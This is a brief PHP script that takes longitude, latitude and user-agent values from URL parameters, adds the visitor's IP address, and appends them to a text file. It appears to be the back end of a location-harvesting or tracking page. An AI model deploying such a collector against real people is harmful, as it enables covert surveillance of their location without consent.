<?php
		$myfile = fopen("data.txt", "a") or die("Unable to open file!");
		$host = $_SERVER["REMOTE_ADDR"];
			
		$txt = "\nlong:" . $_GET['long'] . "\nlat:" . $_GET['lat'] . "\nIP:" . $host . "\nUser agent:" . $_GET["uagent"];
		fwrite($myfile, $txt);
		fclose($myfile);	
?>
		
		

